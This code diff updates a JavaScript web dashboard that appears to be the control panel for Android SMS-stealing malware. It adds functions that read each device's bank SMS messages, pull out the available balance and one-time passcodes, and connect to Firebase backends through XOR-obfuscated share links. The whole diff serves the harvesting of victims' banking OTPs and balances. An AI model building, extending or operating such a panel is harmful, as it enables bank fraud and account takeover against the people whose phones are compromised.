@@ -595,6 +595,19 @@
             return extractBalanceFromText(msg.message);
         }
 
+        function extractAvailableBalance(text) {
+            // Look for "Available Balance" or "Avl Bal" specifically
+            const patterns = [
+                /(?:available\s*balance|avl\s*bal|avail\s*bal|a\/c\s*balance|acct\s*balance)\s*[:.]?\s*[₹Rs.]*\s*([\d,]+\.?\d*)/i,
+                /(?:balance|bal)\s*[:.]?\s*[₹Rs.]*\s*([\d,]+\.?\d*)/i
+            ];
+            for (const p of patterns) {
+                const m = text.match(p);
+                if (m) return m[1];
+            }
+            return null;
+        }
+
         function extractOtp(msg) {
             const match = msg.message.match(/\b(\d{4,8})\b/);
             return match ? match[1] : null;
@@ -608,8 +621,14 @@
         function getLatestBalance(deviceId) {
             const bankMsgs = getDeviceBankSms(deviceId);
             if (!bankMsgs.length) return null;
+            // First try "Available Balance" from latest message
             for (const m of bankMsgs) {
-                const bal = extractBalance(m);
+                const bal = extractAvailableBalance(m.message);
+                if (bal) return bal;
+            }
+            // Fallback to any balance
+            for (const m of bankMsgs) {
+                const bal = extractBalanceFromText(m.message);
                 if (bal) return bal;
             }
             return null;
@@ -659,15 +678,18 @@
         }
         function decodeFirebaseConn(encoded) {
             try {
-                // URLSearchParams may have decoded %XX sequences, but if the raw value
-                // still contains %, we need to handle it properly.
+                // Step 1: Outer URL-decode (in case link was shared via messenger)
                 let base64 = encoded;
-                // If the string was double-URL-encoded by some messenger apps,
-                // try decoding once more
-                if (base64.includes('%') && !base64.includes('+') && !base64.includes('/')) {
+                if (base64.includes('%')) {
                     try { base64 = decodeURIComponent(base64); } catch(e) {}
                 }
-                const dec = decodeURIComponent(atob(base64));
+                // Step 2: Base64 decode
+                let dec = atob(base64);
+                // Step 3: Inner URL-decode (because encodeURIComponent was applied before btoa)
+                if (dec.includes('%')) {
+                    try { dec = decodeURIComponent(dec); } catch(e) {}
+                }
+                // Step 4: XOR decrypt
                 let str = '';
                 for (let i=0; i<dec.length; i++) {
                     str += String.fromCharCode(dec.charCodeAt(i) ^ SALT.charCodeAt(i % SALT.length));
@@ -675,7 +697,7 @@
                 const parts = str.split('|||');
                 return { url: (parts[0] || '').trim(), key: (parts[1] || '').trim() };
             } catch(e) {
-                console.error('Decode failed:', e);
+                console.error('Share link decode failed:', e);
                 return { url: '', key: '' };
             }
         }
@@ -692,6 +714,7 @@
             const s = params.get('s');
             if (s) {
                 const decoded = decodeFirebaseConn(s);
+                console.log('Share link decoded:', decoded.url ? 'SUCCESS' : 'FAIL', decoded.url);
                 if (decoded.url) {
                     const existingIdx = CONNECTIONS.findIndex(c => c.url === decoded.url);
                     let conn;
@@ -710,6 +733,7 @@
                     }
                     localStorage.setItem('rsx_connections', JSON.stringify(CONNECTIONS));
                     activeConn = conn;
+                    // Clean URL so refresh doesn't re-process
                     if (window.history.replaceState) {
                         window.history.replaceState({}, document.title, window.location.pathname);
                     }
@@ -717,6 +741,8 @@
                     showDashboard();
                     toast('Auto‑connected from shared link', 'success');
                     return true;
+                } else {
+                    toast('Invalid share link — could not decode', 'error');
                 }
             }
             return false;
@@ -948,12 +974,11 @@
             if (!str) return 0;
             const s = String(str).trim();
 
-            // 1. Try native Date parse (ISO, RFC, etc.)
+            // 1. Native Date parse
             let d = new Date(s);
             if (!isNaN(d.getTime())) return d.getTime();
 
-            // 2. DD-MM-YYYY | HH:mm AM/PM  or  DD/MM/YYYY HH:mm AM/PM
-            // Handles: 11-08-2026 | 02:59 am  OR  11/08/2026 02:59 AM
+            // 2. DD-MM-YYYY | HH:mm AM/PM  (e.g. 11-08-2026 | 02:59 am)
             const m1 = s.match(/(\d{1,2})[\/\-\.](\d{1,2})[\/\-\.](\d{4})\s*[|\,\s]+\s*(\d{1,2}):(\d{2})\s*(AM|PM|am|pm)/i);
             if (m1) {
                 let hour = parseInt(m1[4], 10);
@@ -961,11 +986,11 @@
                 const ampm = m1[6].toUpperCase();
                 if (ampm === 'PM' && hour !== 12) hour += 12;
                 if (ampm === 'AM' && hour === 12) hour = 0;
-                d = new Date(parseInt(m1[3]), parseInt(m1[2]) - 1, parseInt(m1[1]), hour, minute, 0);
+                d = new Date(parseInt(m1[3]), parseInt(m1[2])-1, parseInt(m1[1]), hour, minute, 0);
                 if (!isNaN(d.getTime())) return d.getTime();
             }
 
-            // 3. DD-MM-YYYY | HH:mm:ss AM/PM  (with seconds)
+            // 3. DD-MM-YYYY | HH:mm:ss AM/PM
             const m2 = s.match(/(\d{1,2})[\/\-\.](\d{1,2})[\/\-\.](\d{4})\s*[|\,\s]+\s*(\d{1,2}):(\d{2}):(\d{2})\s*(AM|PM|am|pm)/i);
             if (m2) {
                 let hour = parseInt(m2[4], 10);
@@ -974,11 +999,11 @@
                 const ampm = m2[7].toUpperCase();
                 if (ampm === 'PM' && hour !== 12) hour += 12;
                 if (ampm === 'AM' && hour === 12) hour = 0;
-                d = new Date(parseInt(m2[3]), parseInt(m2[2]) - 1, parseInt(m2[1]), hour, minute, second);
+                d = new Date(parseInt(m2[3]), parseInt(m2[2])-1, parseInt(m2[1]), hour, minute, second);
                 if (!isNaN(d.getTime())) return d.getTime();
             }
 
-            // 4. DD-MM-YYYY HH:mm:ss (24-hour, no AM/PM)
+            // 4. DD-MM-YYYY HH:mm:ss (24-hour)
             const m3 = s.match(/(\d{1,2})[\/\-\.](\d{1,2})[\/\-\.](\d{4})\s+(\d{1,2}):(\d{2}):(\d{2})/);
             if (m3) {
                 d = new Date(+m3[3], +m3[2]-1, +m3[1], +m3[4], +m3[5], +m3[6]);
@@ -992,21 +1017,14 @@
                 if (!isNaN(d.getTime())) return d.getTime();
             }
 
-            // 6. Date only: DD-MM-YYYY or DD/MM/YYYY
+            // 6. Date only
             const m5 = s.match(/(\d{1,2})[\/\-\.](\d{1,2})[\/\-\.](\d{4})/);
             if (m5) {
                 d = new Date(+m5[3], +m5[2]-1, +m5[1]);
                 if (!isNaN(d.getTime())) return d.getTime();
             }
 
-            // 7. YYYY-MM-DD HH:mm:ss (SQL/ISO style)
-            const m6 = s.match(/(\d{4})-(\d{2})-(\d{2})[\s,T]+(\d{2}):(\d{2}):(\d{2})/);
-            if (m6) {
-                d = new Date(+m6[1], +m6[2]-1, +m6[3], +m6[4], +m6[5], +m6[6]);
-                if (!isNaN(d.getTime())) return d.getTime();
-            }
-
-            // 8. Unix timestamp (seconds or ms)
+            // 7. Unix timestamp
             const num = parseInt(str);
             if (!isNaN(num) && num > 1000000000) {
                 return num > 1000000000000 ? num : num * 1000;
@@ -1440,23 +1458,19 @@
                 setupError.classList.remove('hidden');
                 return;
             }
-            // Check duplicate URL
-            const existing = CONNECTIONS.find(c => c.url === url);
-            if (existing) {
-                setupError.textContent = '⚠️ Ye Firebase already exists! "' + (existing.label || existing.url) + '"';
+            // Check for duplicate URL
+            const dup = CONNECTIONS.find(c => c.url === url);
+            if (dup) {
+                setupError.textContent = '⚠️ Already exists: "' + (dup.label || dup.url) + '"';
                 setupError.classList.remove('hidden');
                 toast('Firebase already exists!', 'error');
                 return;
             }
-            // Auto-label from Firebase URL if empty
+            // Auto-label from URL hostname if empty
             let label = accLabel.value.trim();
             if (!label) {
-                try {
-                    const u = new URL(url);
-                    label = u.hostname.replace(/\.firebaseio\.com.*/,'');
-                } catch(e) {
-                    label = url.replace(/https?:\/\//,'').replace(/\.firebaseio\.com.*/,'');
-                }
+                try { label = new URL(url).hostname.replace(/\.firebaseio\.com.*/,''); }
+                catch(e) { label = url.replace(/https?:\/\//,'').replace(/\.firebaseio\.com.*/,''); }
             }
             setupError.classList.add('hidden');
             const conn = {
